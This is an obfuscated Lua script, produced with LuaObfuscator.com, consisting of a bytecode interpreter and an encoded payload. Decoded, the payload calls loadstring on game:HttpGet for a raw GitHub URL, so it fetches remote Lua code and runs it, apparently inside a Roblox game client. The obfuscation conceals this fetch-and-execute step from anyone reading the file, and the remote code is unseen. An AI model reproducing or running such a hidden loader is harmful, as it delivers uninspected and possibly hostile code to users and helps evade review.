--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.7) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v86=v2(v0(v30,16));if v19 then local v111=v5(v86,v19);v19=nil;return v111;else return v86;end end end);local function v20(v31,v32,v33) if v33 then local v87=0;local v88;while true do if (v87==(0 -0)) then v88=(v31/((5 -3)^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-((1328 -396) -(857 + (1139 -(68 + 997)))))) + (569 -(367 + 201)))) ;return v88-(v88%(928 -((1484 -(226 + 1044)) + 713))) ;end end else local v89=0 + 0 ;local v90;while true do if (v89==(0 + 0)) then v90=(879 -(282 + 595))^(v32-1) ;return (((v31%(v90 + v90))>=v90) and (1638 -(1523 + 114))) or (0 + 0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (8 -6) );v18=v18 + (119 -(32 + 85)) ;return (v36 * (251 + 5)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 1 + 2 );v18=v18 + (961 -(892 + (415 -(87 + 263)))) ;return (v40 * (40022563 -23245347)) + (v39 * (121138 -55602)) + (v38 * (469 -213)) + v37 ;end local function v24() local v41=180 -(67 + 36 + 77) ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==1) then v44=1 + 0 + 0 ;v45=(v20(v43,(774 -(201 + 571)) -1 ,15 + 5 ) * (((12 -5) -5)^(984 -(802 + 150)))) + v42 ;v41=5 -3 ;end if ((3 -1)==v41) then v46=v20(v43,21,23 + 8 );v47=((v20(v43,1029 -(915 + 82) )==1) and  -(2 -1)) or (1 + 0) ;v41=3 -0 ;end if (v41==(1187 -(1069 + 118))) then v42=v23();v43=v23();v41=2 -1 ;end if (v41==((444 -(145 + 293)) -(12 -9))) then if (v46==(0 + 0)) then if (v45==((430 -(44 + 386)) -0)) then return v47 * (0 + 0) ;else v46=792 -(368 + 423) ;v44=0 -0 ;end elseif (v46==(2065 -(10 + 8))) then return ((v45==(0 -0)) and (v47 * (1/(442 -(416 + 26))))) or (v47 * NaN) ;end return v8(v47,v46-((4752 -(998 + 488)) -2243) ) * (v44 + (v45/((1 + 1)^52))) ;end end end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(0 + 0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -(3 -2) );v18=v18 + v48 ;local v50={};for v66=3 -2 , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 0;end)();local v92=(function() return;end)();local v94=(function() return;end)();while true do if (v91==(971 -(140 + 831))) then local v116=(function() return 0;end)();local v117=(function() return;end)();while true do if (v116~=(1850 -(1409 + 441))) then else v117=(function() return 718 -(15 + 703) ;end)();while true do if ((1 + 0)==v117) then v91=(function() return  #"~";end)();break;end if (v117==0) then v92=(function() return v93();end)();v94=(function() return nil;end)();v117=(function() return 439 -(262 + 176) ;end)();end end break;end end end if (v91== #",") then if (v92== #"|") then v94=(function() return v93()~=0 ;end)();elseif (v92==(1723 -(345 + 1376))) then v94=(function() return v95();end)();elseif (v92~= #"91(") then else v94=(function() return v96();end)();end v97[v98]=(function() return v94;end)();break;end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v52=(function() return function(v99,v100,v101) local v102=(function() return 688 -(198 + 490) ;end)();local v103=(function() return;end)();while true do if (v102~=(0 -0)) then else v103=(function() return 0;end)();while true do if (v103==(0 -0)) then v99[v100-#"!" ]=(function() return v101();end)();return v99,v100,v101;end end break;end end end;end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {v53,v54,nil,v55};end)();local v57=(function() return v23();end)();local v58=(function() return {};end)();for v68= #"|",v57 do FlatIdent_25011,Type,v21,Cons,v24,v25,v58,v68=(function() return v51(FlatIdent_25011,Type,v21,Cons,v24,v25,v58,v68);end)();end v56[ #"xnx"]=(function() return v21();end)();for v69= #"\\",v23() do local v70=(function() return v21();end)();if (v20(v70, #"!", #",")==0) then local v107=(function() return 1206 -(696 + 510) ;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();while true do if (2~=v107) then else if (v20(v109, #"<", #">")== #"}") then v110[2]=(function() return v58[v110[2]];end)();end if (v20(v109,2,3 -1 )~= #"}") then else v110[ #"19("]=(function() return v58[v110[ #"-19"]];end)();end v107=(function() return 1265 -(1091 + 171) ;end)();end if (v107~=3) then else if (v20(v109, #"xxx", #"xnx")== #"{") then v110[ #"0836"]=(function() return v58[v110[ #"?id="]];end)();end v53[v69]=(function() return v110;end)();break;end if ((0 + 0)~=v107) then else v108=(function() return v20(v70,2, #"asd");end)();v109=(function() return v20(v70, #"0313",6);end)();v107=(function() return 3 -2 ;end)();end if (v107~=(3 -2)) then else local v120=(function() return 0;end)();local v121=(function() return;end)();while true do if (v120==(374 -(123 + 251))) then v121=(function() return 0 -0 ;end)();while true do if (0~=v121) then else v110=(function() return {v22(),v22(),nil,nil};end)();if (v108==0) then local v166=(function() return 0;end)();while true do if (v166~=(698 -(208 + 490))) then else v110[ #"asd"]=(function() return v22();end)();v110[ #"xnxx"]=(function() return v22();end)();break;end end elseif (v108== #"|") then v110[ #"asd"]=(function() return v23();end)();elseif (v108==(1 + 1)) then v110[ #"91("]=(function() return v23() -((1 + 1)^(852 -(660 + 176))) ;end)();elseif (v108== #"xxx") then local v174=(function() return 0 + 0 ;end)();local v175=(function() return;end)();while true do if (v174~=0) then else v175=(function() return 0;end)();while true do if (v175~=0) then else v110[ #"91("]=(function() return v23() -((204 -(14 + 188))^(691 -(534 + 141))) ;end)();v110[ #"0836"]=(function() return v22();end)();break;end end break;end end end v121=(function() return 1 + 0 ;end)();end if (v121~=1) then else v107=(function() return 2 + 0 ;end)();break;end end break;end end end end end end for v71= #">",v23() do v54,v71,v28=(function() return v52(v54,v71,v28);end)();end return v56;end local function v29(v60,v61,v62) local v63=v60[1 + 0 ];local v64=v60[(414 -(15 + 398)) + 1 ];local v65=v60[6 -3 ];return function(...) local v72=v63;local v73=v64;local v74=v65;local v75=v27;local v76=1 -0 ;local v77= -(2 -1);local v78={};local v79={...};local v80=v12("#",...) -(1 + 0) ;local v81={};local v82={};for v104=0 + 0 ,v80 do if (v104>=v74) then v78[v104-v74 ]=v79[v104 + (397 -(115 + 281)) ];else v82[v104]=v79[v104 + (2 -1) ];end end local v83=(v80-v74) + 1 + 0 ;local v84;local v85;while true do v84=v72[v76];v85=v84[(7 -5) -1 ];if (v85<=(21 -(9 + 6))) then if (v85<=(869 -(550 + 317))) then if (v85<=(0 -0)) then local v126=v84[2 -0 ];v82[v126]=v82[v126](v13(v82,v126 + ((2 + 0) -1) ,v77));elseif ((2181<2874) and (v85>((1136 -(20 + 830)) -(134 + 151)))) then local v130=v84[1290 -(776 + 217 + 295) ];local v131,v132=v75(v82[v130](v13(v82,v130 + (1666 -(970 + 695)) ,v84[1174 -(418 + 753) ])));v77=(v132 + v130) -((127 -(116 + 10)) -0) ;local v133=1990 -(582 + 1408) ;for v155=v130,v77 do v133=v133 + (3 -2) ;v82[v155]=v131[v133];end else v82[v84[2]]();end elseif (v85<=(4 -0)) then if (v85>(11 -8)) then local v134=v84[(135 + 1691) -(1195 + 629) ];local v135=v82[v84[3 -0 ]];v82[v134 + (242 -((925 -(542 + 196)) + 54)) ]=v135;v82[v134]=v135[v84[784 -(162 + (1324 -706)) ]];else v82[v84[2 + 0 ]]=v84[3];end elseif (v85>(4 + 1)) then v82[v84[3 -1 ]]=v84[4 -1 ];else do return;end end elseif ((v85<=(1 + 8)) or (2689<=343)) then if (v85<=(1643 -(401 + 972 + 263))) then local v128=1000 -(451 + 549) ;local v129;while true do if (v128==(0 + 0)) then v129=v84[2];v82[v129]=v82[v129](v13(v82,v129 + (1 -0) ,v77));break;end end elseif (v85==(13 -5)) then do return;end else local v143=1384 -(746 + 638) ;local v144;local v145;while true do if (v143==((2 + 0) -(1 + 0))) then v82[v144 + 1 + 0 ]=v145;v82[v144]=v145[v84[(12 -7) -1 ]];break;end if (v143==(584 -(57 + 527))) then v144=v84[1429 -(41 + (3553 -2167)) ];v145=v82[v84[106 -(17 + 86) ]];v143=1 + 0 ;end end end elseif (v85<=((1903 -(1126 + 425)) -((623 -(118 + 287)) + 123))) then if ((v85>(28 -18)) or (1869==2009)) then local v146=1581 -(1535 + (180 -134)) ;local v147;local v148;local v149;local v150;while true do if ((((1122 -(118 + 1003)) -0)==v146) or (3546<2322)) then v77=(v149 + v147) -((2 -1) + 0) ;v150=0 + 0 ;v146=1 + 1 ;end if (v146==((939 -(142 + 235)) -(306 + 254))) then for v167=v147,v77 do v150=v150 + (1 -0) ;v82[v167]=v148[v150];end break;end if ((v146==(65 -((136 -106) + 35))) or (2082==4773)) then v147=v84[1 + 1 ];v148,v149=v75(v82[v147](v13(v82,v147 + (1 -0) ,v84[1470 -(899 + 124 + 444) ])));v146=1 + 0 ;end end else v82[v84[1214 -(323 + 889) ]]();end elseif ((3244>1055) and (v85>(989 -(553 + 424)))) then v82[v84[4 -2 ]]=v62[v84[583 -(361 + (413 -194)) ]];else v82[v84[605 -(268 + 335) ]]=v62[v84[3]];end v76=v76 + (291 -(60 + 230)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574035A3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F44756331382D636F64652F64756373686172656C696E6B2F6D61696E2F5363726970745F44756373686172656C696E6B2E6C75612E6C756100083O00120D3O00013O00120D000100023O002009000100010003001203000300044O0002000100034O00075O00022O00013O000100012O00053O00017O00",v9(),...);